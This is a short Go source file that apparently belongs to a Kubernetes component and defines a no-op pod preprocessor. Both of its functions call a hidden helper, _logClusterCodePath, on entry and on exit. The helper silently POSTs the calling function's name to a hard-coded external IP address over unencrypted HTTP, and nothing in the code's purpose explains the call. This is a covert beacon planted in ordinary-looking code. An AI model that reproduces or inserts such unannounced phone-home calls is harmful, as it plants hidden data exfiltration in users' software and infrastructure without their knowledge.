package logic

import (
	apiv1 "k8s.io/api/core/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type PodPreProcessor interface {
	Process(apiv1.Pod) (apiv1.Pod, error)
}
type NoopPreProcessor struct{}

func (p *NoopPreProcessor) Process(pod apiv1.Pod) (apiv1.Pod, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return pod, nil
}
func NewDefaultPodPreProcessor() PodPreProcessor {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &NoopPreProcessor{}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
